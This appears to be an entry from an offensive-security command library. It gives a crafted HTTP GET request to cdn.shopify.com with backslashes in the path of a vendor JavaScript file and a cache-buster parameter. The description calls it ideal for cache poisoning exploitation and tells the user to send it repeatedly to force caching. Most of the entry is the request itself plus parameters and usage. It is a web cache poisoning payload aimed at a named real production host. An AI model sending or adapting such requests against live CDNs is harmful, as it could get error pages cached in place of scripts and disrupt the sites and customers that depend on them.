---
id: cmd-uuid-002
data: >-
  GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1

  Host: cdn.shopify.com

  Connection: close

  Upgrade-Insecure-Requests: 1

  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

  Accept-Encoding: gzip, deflate

  Accept-Language: en-US,en;q=0.9
tags:
  - http-get
  - cache-poisoning
  - backslash
type: command
output: |-
  HTTP/1.1 404 Not Found
  Content-Type: text/html

  [404 error page HTML]
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.653Z'
verified: false
validated: true
submitted: true
---
# Modified-GET-Request-with-Backslashes-and-Cache-Buster

## Command

```http
GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
Host: cdn.shopify.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

## Description

This modified HTTP GET request uses backslashes in the path to trigger a 404 from the origin server and includes a cache buster query parameter for testing isolation. Ideal for cache poisoning exploitation on CDNs with normalization issues.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host | Target domain (cdn.shopify.com) | Yes |
| Path | Modified path with backslashes (\) | Yes |
| cachebuster | Random query value for test isolation | Yes |
| User-Agent | Client browser identifier | Yes |

## Examples

### Basic Poisoning Usage

```http
GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
Host: cdn.shopify.com
...
```

### Repeated Usage

Send multiple times to force caching.

## Expected Output

404 Not Found response with error page HTML from the origin server.

## Related

- [[commands/Legitimate-GET-Request-to-CDN-File]]
- [[procedures/Craft-Cache-Poisoning-Request-with-Backslashes]]
